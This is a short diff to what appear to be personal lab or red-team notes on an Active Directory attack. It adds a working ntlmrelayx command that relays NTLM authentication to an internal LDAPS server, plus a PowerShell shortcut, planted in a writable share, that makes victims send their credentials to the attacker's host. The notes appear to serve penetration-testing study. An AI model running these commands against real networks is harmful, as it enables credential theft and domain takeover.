@@ -63,4 +63,15 @@ is `SYSVOL`).
 This enables loading of a malicious template from a location that we
 control.
 
+
 ![[Pasted image 20250505062951.png]]
+
+Open WSL Ubuntu shell and start NTLM relay (relay) - WSLToTh3Rescue!
+```bash
+sudo ntlmrelayx.py -t ldaps://172.16.2.1 -wh 172.16.100.48 --http-port '80,8080' -i --no-smb-server
+```
+
+Create new shortcut with this command and place in writable share
+```bash
+C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -Command "Invoke WebRequest -Uri 'http://172.16.100.48' -UseDefaultCredentials"
+```
